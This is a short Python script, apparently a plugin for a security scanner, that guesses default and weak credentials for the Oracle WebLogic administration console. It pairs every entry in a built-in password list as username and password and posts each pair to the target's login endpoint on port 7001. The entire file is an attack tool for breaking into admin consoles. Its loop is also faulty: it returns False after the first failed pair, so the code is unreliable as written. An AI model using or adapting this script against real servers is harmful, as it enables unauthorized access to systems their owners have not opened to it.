#!/usr/bin/env python
# coding: utf-8
# Date  : 2018-07-12 21:06:36
# Author: b4zinga
# Email : b4zinga@outlook.com
# Func  : weblogic weak password

import requests

def run(url):
    pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe', 'wlcsystem', 'wlpisystem']
    for user in pwddict:
        for pwd in pwddict:
            data = {
                'j_username':user,
                'j_password':pwd,
                'j_character_encoding':'UTF-8'
            }
            req = requests.post(url+':7001/console/j_security_check', data=data, allow_redirects=False, verify=False, timeout=5)

            if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                return 'WebLogic username: '+user+'  password: '+pwd
            else:
                return False